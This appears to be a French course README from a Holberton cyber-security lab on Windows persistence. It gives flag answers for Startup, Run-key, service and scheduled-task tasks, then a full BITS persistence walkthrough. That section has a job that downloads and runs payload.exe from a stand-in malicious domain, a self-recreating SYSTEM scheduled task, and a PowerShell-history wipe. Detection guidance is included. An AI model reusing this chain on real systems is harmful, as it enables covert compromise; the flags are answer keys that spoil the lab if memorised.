# 0x00 - Techniques de Persistance Windows

**Dépôt:** [holbertonschool-cyber_security](https://github.com/holbertonschool/holbertonschool-cyber_security)  
**Répertoire:** `persistence_in_windows/0x00_acces_persistence_techniques`

---

## ⚠️ Note Importante - Décalage des Flags

**La numérotation des flags est décalée de 1 entre ce dépôt et la VM:**
- Fichier local **Flag 0** = Récupérer **Flag 1** de la VM (Dossier Startup)
- Fichier local **Flag 1** = Récupérer **Flag 2** de la VM (Clés de Registre)
- Fichier local **Flag 2** = Récupérer **Flag 3** de la VM (Services Windows)
- Fichier local **Flag 3** = Récupérer **Flag 4** de la VM (Tâches Planifiées)

---

## Tâche 0 - Persistance via Dossier Startup

**Objectif:** Comprendre comment les attackeurs utilisent le dossier Startup pour maintenir une persistance sur Windows.

**Fichier attendu:** `0-flag.txt`  
**Flag:** `05809c521098e03f0bcc7cc878399d0f`

### 1. Introduction

Le dossier Startup est l'une des techniques de persistance les plus simples et les plus couramment utilisées par les malwares. A chaque connexion d'utilisateur, Windows exécute automatiquement tous les exécutables présents dans ce dossier.

### 2. Comprendre le Dossier Startup

Les emplacements clés pour la persistance Startup:
- **Utilisateur:** `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
- **Global (Système):** `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

Tous les fichiers dans ces répertoires sont exécutés automatiquement à la connexion.

### 3. Localisation des Fichiers Malveillants

**Étapes:**
1. Naviguer vers les dossiers Startup mentionnés ci-dessus
2. Identifier les fichiers exécutables ou scripts suspects
3. Note: Le fichier peut contenir un faux flag intentionnellement

### 4. Extraction du Flag

**Méthode:** Hachage MD5
Le vrai flag n'est pas le contenu du fichier, mais le **hash MD5 du fichier batch lui-même**.

**Commande PowerShell:**
```powershell
Get-FileHash -Path "C:\chemin\vers\vmtoolsd.bat" -Algorithm MD5 | Select-Object -ExpandProperty Hash
```

### 5. Analyse et Détection

**Indicateurs de détection:**
- Fichiers exécutables anormaux dans les dossiers Startup
- Scripts PowerShell ou batch files dans ces emplacements
- Fichiers récemment modifiés
- Fichiers cachés ou avec des attributs suspects

**Commande de monitoring:**
```powershell
Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -File
Get-ChildItem -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" -File
```

### 6. Conclusion

La persistance via Startup est facile à implémenter mais également facile à détecter avec un monitoring basique. Cette technique est souvent combinée avec d'autres méthodes de persistance pour une résilience accrue.

---

## Tâche 1 - Persistance via Clés de Registre

**Objectif:** Comprendre comment modifier les clés de registre Windows pour créer une persistance automatique au démarrage.

**Fichier attendu:** `1-flag.txt`  
**Flag:** `Holberton{Persist_Through_Win_Registers}`

### 1. Introduction

Les clés de registre Run sont parmi les techniques de persistance les plus populaires. Les attackeurs modifient `HKEY_CURRENT_USER` ou `HKEY_LOCAL_MACHINE` pour forcer l'exécution de scripts à la connexion.

### 2. Comprendre les Clés de Registre Run

**Emplacements clés:

**- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`

Chaque entry dans ces clés est exécutée automatiquement à la connexion de l'utilisateur.

### 3. Localisation des Clés Malveillantes

**Étapes:**
1. Ouvrir Registry Editor (regedit)
2. Naviguer vers les clés Run mentionnées
3. Identifier des entrées suspectes contenant des références PowerShell
4. Noter le chemin du script exécuté

**Clé trouvée:**
```
flag2 -> powershell.exe -ep bypass -File "C:\Program Files (x86)\WindowsPowerShell\Modules\PackageManagement\1.0.0.1\UserProfile.ps1"
```

### 4. Extraction et Décodage du Flag

Le script PowerShell contient un flag encodé en hexadécimal.

**Méthode de décodage hex:**
```powershell
$a=0x48,0x6f,0x6c,0x62,0x65,0x72,0x74,0x6f,0x6e,0x7b,0x50,0x65,0x72,0x73,0x69,0x73,0x74,0x5f,0x54,0x68,0x72,0x6f,0x75,0x67,0x68,0x5f,0x57,0x69,0x6e,0x5f,0x52,0x65,0x67,0x69,0x73,0x74,0x65,0x72,0x73,0x7d
[System.Text.Encoding]::ASCII.GetString($a)
# Résultat: Holberton{Persist_Through_Win_Registers}
```

### 5. Analyse et Détection

**Indicateurs de détection:**
- Nouvelles entries dans les clés Run
- Chemins que pointant vers des répertoires non-standard
- Commandes PowerShell avec `-ep bypass` ou `-ExecutionPolicy Bypass`
- Script encodés ou obfusqués

**Commande de monitoring:**
```powershell
Get-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object -ExpandProperty Property
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

### 6. Nettoyage Complet

**Phase de nettoyage requise:**
1. Supprimer toutes les entrées de registre modifiées
2. Supprimer les fichiers scripts associés
3. Effacer l'historique PowerShell
4. Restaurer le système à son état initial

```powershell
# Supprimer une entrée de registre
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "flag2"

# Effacer l'historique PowerShell
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
```

---

## Tâche 2 - Persistance via Services Windows

**Objectif:** Identifier et extraire les flags cachés dans les services Windows malveillants.

**Fichier attendu:** `2-flag.txt`  
**Flag:** `Holberton{L0ng_Live_S3rvices}`

### 1. Introduction

Les services Windows peuvent être modifiés ou créés pour exécuter du code malveillant avec les privilèges SYSTEM. Cette technique offre une persistance très robuste.

### 2. Comprendre les Services Windows

Les services Windows fonctionnent en arrière-plan avec des privilèges élevés et redémarrent automatiquement après un reboot. Les attackeurs créent des services malveillants qui exécutent des payloads.

### 3. Localisation des Services Malveillants

**Étapes:**
1. Énumérer tous les services Windows
2. Rechercher des services suspects, en particulier ceux nommés `flag3`
3. Examiner la description du service pour les indicators de flags

**Énumération rapide:**
```powershell
Get-WmiObject Win32_Service | Select-Object Name, DisplayName, PathName, Description | Format-Table -AutoSize
```

### 4. Extraction du Flag Encodé en Base64

Le flag est stocké encodé en base64 dans la description du service.

**Commandes de détection et décodage:**
```powershell
# Chercher le service suspect
Get-WmiObject Win32_Service | Where-Object { $_.Name -eq "flag3" } | Select-Object Description

# Description trouvée: "...your flag is base64 encoded: SG9sYmVydG9ue0wwbmdfTGl2ZV9TM3J2aWNlc30="

# Décoder le base64
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SG9sYmVydG9ue0wwbmdfTGl2ZV9TM3J2aWNlc30="))
# Résultat: Holberton{L0ng_Live_S3rvices}
```

### 5. Analyse et Détection

**Indicateurs de détection:**
- Services avec des noms génériques ou trompeurs
- Descriptions contenant du texte encodé
- Services pointant vers des chemins non-standard
- Services créés récemment
- Services avec des droits SYSTEM inutiles

**Commande d'audit complet:**
```powershell
Get-WmiObject Win32_Service | Where-Object { $_.StartMode -eq "Auto" } | ForEach-Object {
    Write-Host "Service: $($_.Name) - Description: $($_.Description)"
}
```

### 6. Suppression des Services Malveillants

**Procédure de suppression:**
```powershell
# Arrêter le service
Stop-Service -Name "flag3" -Force -ErrorAction SilentlyContinue

# Supprimer le service
Remove-Item "HKLM:\System\CurrentControlSet\Services\flag3" -Force -ErrorAction SilentlyContinue
```

---

## Tâche 3 - Persistance via Tâches Planifiées

**Objectif:** Découvrir et extraire les flags des tâches planifiées Windows suspectes.

**Fichier attendu:** `3-flag.txt`  
**Flag:** `Holberton{Messi_Schedule_N10}`


### 1. Introduction

Les tâches planifiées Windows (Scheduled Tasks) sunt un mécanisme puissant pour exécuter un code automatiquement à des moments spécifiques. Les attackers les exploitent pour créer une persistance hautement flexible.

### 2. Comprendre les Tâches Planifiées

Windows Scheduler permet de programmer l'exécution de scripts ou d'exécutables basé sur les triggers (événements, horaires, connexion, etc.). Les tâches malveillantes ont souvent des descriptions contenant des flags.

### 3. Localisation des Tâches Suspectes

**Étapes:**
1. Lister toutes les tâches planifiées
2. Rechercher celles contenant "flag" ou "Holberton" dans la description
3. Identifier la tâche `flag04`

**Énumération:**
```powershell
# Afficher toutes les tâches
Get-ScheduledTask | Format-Table -Property TaskName, Description -AutoSize

# Chercher les tâches suspectes
Get-ScheduledTask | Where-Object { $_.Description -match "flag|Holberton" }
```

### 4. Extraction du Flag

Le flag est directement stocké dans la description de la tâche planifiée.

**Commandes:**
```powershell
# Récupérer la tâche spécifique
(Get-ScheduledTask -TaskName "flag04").Description

# Résultat directement lisible: Holberton{Messi_Schedule_N10}
```

### 5. Analyse et Détection

**Indicateurs de détection:**
- Tâches créées par des utilisateurs non-admin
- Tâches avec des noms génériques (Update, Service, Task, etc.)
- Tâches exécutant PowerShell avec des arguments suspects
- Tâches avec des descriptions contenant des flags ou du texte encodé
- Tâches programmées pour s'exécuter fréquemment
- Triggers anormaux (e.g., At system startup, On user login)

**Monitoring complet:**
```powershell
Get-ScheduledTask -TaskPath "*" | Where-Object {
    $_.Triggers.CimInstanceProperties.Value -contains "AtLogon" -or 
    $_.Triggers.CimInstanceProperties.Value -contains "AtStartup"
} | Format-List TaskName, Description, Actions
```

### 6. Suppression des Tâches Malveillantes

**Procédure de suppression:**
```powershell
# Désactiver la tâche
Disable-ScheduledTask -TaskName "flag04"

# Supprimer la tâche
Unregister-ScheduledTask -TaskName "flag04" -Confirm:$false
```

---

## Tâche 4 - Persistance via BITSAdmin

**Objectif:** Créer un job BITS qui télécharge et exécute un payload malveillant pour démontrer l'accès persistant sur une machine Windows compromis.

**Fichier script:** `persistence.ps1`

### 1. Introduction

#### Vue d'ensemble de BITS et son rôle dans Windows
BITS (Background Intelligent Transfer Service) est un service Windows légitime conçu pour transférer des fichiers en arrière-plan avec limitation de bande passante réseau. Il a été créé à l'origine pour gérer efficacement les mises à jour Windows.

#### Comment les attackers exploitent BITS pour la persistance et l'exécution discrète
- **Persistance après redémarrage:** Les jobs BITS se relancent automatiquement après un redémarrage système
- **Discrétion:** Le trafic BITS apparaît comme du trafic de mise à jour Windows légitime (ports 80/443)
- **Escalade de privilèges:** Les jobs peuvent s'exécuter en contexte SYSTEM
- **Exécution retardée:** Les jobs peuvent être programmés pour exécuter à des moments spécifiques
- **Commandes de notification:** BITS peut déclencher des payloads exécutables à la fin du téléchargement
- **Faible détection:** La plupart des organisations acceptent BITS sans surveiller les détails des jobs

### 2. Comprendre BITS et Ses Capacités

#### Comment BITS fonctionne sous Windows

**États des jobs BITS:**
```powershell
# Suspended  - Le job est suspendu
# Transferring - Le téléchargement est en cours
# Transferred - Le téléchargement est complet, en attente de reprise
# Acknowledged - Le téléchargement réussi
# Cancelled - Le job a été supprimé
# Error - Le transfert a échoué
```

**Flags de notification BITS:**
```powershell
# 1 - Notifier à la fin du téléchargement
# 2 - Notifier sur modification
# 3 - Notifier sur fin ET modification
# 4 - Notifier sur erreur
```

#### Pourquoi les attackers préfèrent BITS pour les opérations discrètes
1. Fonctionnalité intégrée (aucun outil tiers nécessaire)
2. Les opérations au niveau administrateur se confondent avec une activité légitime
3. Les jobs persistent dans le registre Windows
4. Basé sur PowerShell (technique living-off-the-land)
5. Contournement de la détection antivirus basée sur les fichiers

### 3. Créer un Job BITS Malveillant

#### Guide étape par étape utilisant BITSAdmin

**Paramètres de configuration (depuis persistence.ps1):**
```powershell
$JobName        = "UpdateSystem"
$PayloadUrl     = "https://mechantvilaincontenue.com/payload.exe"
$DestPath       = "C:\Users\Public\update.exe"
$LogFile        = "C:\Windows\Temp\bits_persistence.log"
$MaxRetries     = 3
$RetryDelay     = 5
```

**Étape 1: Énumérer les Jobs BITS Existants**
```powershell
# Lister tous les jobs BITS pour tous les utilisateurs
bitsadmin /list /allusers
bitsadmin /list /allusers /verbose
```

**Étape 2: Créer le Job BITS avec Gestion d'Erreur**
```powershell
# Créer le job
bitsadmin /create $JobName

# Ajouter le fichier à télécharger
bitsadmin /addfile $JobName "$PayloadUrl" "$DestPath"

# Vérifier la création
bitsadmin /info $JobName /verbose
```

**Étape 3: Configurer les Paramètres de Persistance**
```powershell
# Définir la commande de notification (payload à exécuter)
bitsadmin /SetNotifyCmdLine $JobName "$DestPath" ""

# Définir les flags de notification (1=fin, 3=fin+erreur)
bitsadmin /SetNotifyFlags $JobName 3

# Définir une priorité basse pour la discrétion
bitsadmin /SetMinimumRetryDelay $JobName 60
bitsadmin /SetNoProgressTimeout $JobName 1209600
```

**Étape 4: Démarrer le Job**
```powershell
bitsadmin /resume $JobName
```

### 4. Implémenter un Mécanisme de Persistance

#### Script Checker (depuis persistence.ps1)

Le script *persistence.ps1* implémente:

**A. Système de Logging Complet**
```powershell
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogMessage = "[$Timestamp] [$Level] $Message"
    Write-Host $LogMessage
    Add-Content $LogFile $LogMessage
}
```

**B. Logique de Recréation du Job (Script Checker)**
Le script checker surveille si le job existe et le recrée s'il est supprimé:
```powershell
if (-not (bitsadmin /list /allusers | Select-String $JobName)) {
    # Le job n'existe pas, le recréer
    bitsadmin /create $JobName
    bitsadmin /addfile $JobName '$PayloadUrl' '$DestPath'
    bitsadmin /SetNotifyCmdLine $JobName '$DestPath' ''
    bitsadmin /SetNotifyFlags $JobName 3
    bitsadmin /resume $JobName
    Write-Log "Job restauré avec succès"
}
```

**C. Automatisation via Tâche Planifiée**

Le script crée une tâche planifiée Windows qui exécute le checker toutes les 5 minutes:
```powershell
$trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) 
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
          -Argument "-NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\checker.ps1"
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

Register-ScheduledTask -TaskName "BITS_Persistence_Monitor" -Trigger $trigger `
                      -Action $action -Principal $principal
```

**D. Mécanisme de Retry pour Téléchargements Échoués**
```powershell
# Implémenté avec logique try-catch et retry
$retryCount = 0
while ($retryCount -lt $MaxRetries -and -not $jobCreated) {
    try {
        bitsadmin /create $JobName 2>$null
        # ... reste de la création
        $jobCreated = $true
    } catch {
        $retryCount++
        Start-Sleep -Seconds $RetryDelay
    }
}
```

### 5. Détecter et Prévenir les Jobs BITS Malveillants

#### Identifier les Jobs BITS Suspects

**Commandes de détection:**
```powershell
# Lister tous les jobs BITS
Get-BitsTransfer -AllUsers -Verbose

# Vérifier les détails d'un job
Get-BitsTransfer -JobId {id} | Format-List *

# Surveiller les logs d'événements BITS
Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" -MaxEvents 50

# Indicateurs suspects
Get-BitsTransfer -AllUsers | Where-Object { 
    $_.DisplayName -match "(update|system|service)" -and 
    $_.Owner -ne "NT AUTHORITY\SYSTEM"
}
```

#### IDs d'Événements Windows

| ID Événement | Description | Indicateur |
|----------|-------------|-----------|
| 3 | Job créé | Création d'un nouveau job BITS |
| 4 | Job repris | Le job a commencé le transfert |
| 16387 | Job transféré | Téléchargement du fichier complété |
| 16388 | Erreur de job | Le transfert a échoué |
| 16400 | Job suspendu | Le job a été suspendu |

**Patterns suspects:**
- Jobs avec des URLs externes vers des domaines non-Microsoft
- Jobs avec `NotifyCmdLine` pointant vers des chemins d'exécutables
- Jobs exécutant sous SYSTEM avec du contenu créé par l'utilisateur
- Création/suppression multiple de jobs en peu de temps
- Jobs avec des valeurs `NoProgressTimeout` étendues

#### Mesures de Sécurité

**1. Désactiver BITS si Non Nécessaire**
```powershell
# Arrêter le service BITS
Stop-Service -Name BITS
Set-Service -Name BITS -StartupType Disabled
```

**2. Surveiller l'Activité BITS**
```powershell
# Activer l'audit avancé des logs d'événements
auditpol /set /subcategory:"Process Creation" /success:enable
```

**3. Créer un Whitelist de Jobs BITS Légitimes**
```powershell
# Documenter tous les jobs BITS légitimes
Get-BitsTransfer -AllUsers | Export-Csv baseline_bits_jobs.csv
```

**4. Bloquer les Tâches Planifiées Suspectes**
```powershell
# Bloquer l'exécution de PowerShell dans les tâches planifiées
# via Group Policy ou AppLocker
```

**5. Segmentation Réseau**
- Surveiller les connexions sortantes sur les ports 80/443
- Accepter en whitelist uniquement les serveurs Microsoft Update connus
- Bloquer les URLs externes des jobs BITS

### 6. Conclusion

#### Résumé de la méthode d'attaque
La persistance BITS est une technique sophistiquée qui exploite les fonctionnalités Windows légitimes pour maintenir un accès persistant. En combinant la création de jobs BITS, les commandes de notification et les scripts de récupération automatique, les attackers obtiennent:
- **Persistance fiable:** Les jobs survivent aux redémarrages système
- **Exécution discrète:** Se confond avec le trafic Windows légitime
- **Résilience:** Recréation automatique si détectée et supprimée
- **Escalade de privilèges:** Exécution en contexte SYSTEM

#### Bonnes pratiques pour la défense et la mitigation

**Pour les Défenseurs:**
1. Surveiller tous les événements de création et modification de jobs BITS
2. Implémenter un filtrage de sortie strict sur les ports 80/443
3. Désactiver le service BITS si non requis
4. Audits réguliers des tâches planifiées et des clés de registre Run
5. Maintenir des baselines détaillées des jobs BITS légitimes
6. Déployer des solutions EDR qui détectent les patterns d'abus BITS
7. Implémenter la liste blanche d'applications pour les chemins d'exécutables
8. Activer la journalisation des blocs de script PowerShell

**Pour les Red Teamers/Evaluateurs:**
- Toujours nettoyer les jobs BITS et les tâches planifiées après les tests
- Utiliser des payloads et domaines réalistes pendant les evaluations
- Documenter la chaîne de persistance pour la remédiation
- Tester les capacités de détection des solutions de monitoring de sécurité

---

**Fichier d'implémentation:** [persistence.ps1](persistence.ps1)  
**Fichier de log:** `C:\Windows\Temp\bits_persistence.log`  
**Nom de la tâche:** `BITS_Persistence_Monitor`  
**Script Checker:** `C:\Windows\Temp\checker.ps1`

---

**Statut:** Complétée  
**Dernière mise à jour:** 19 mars 2026
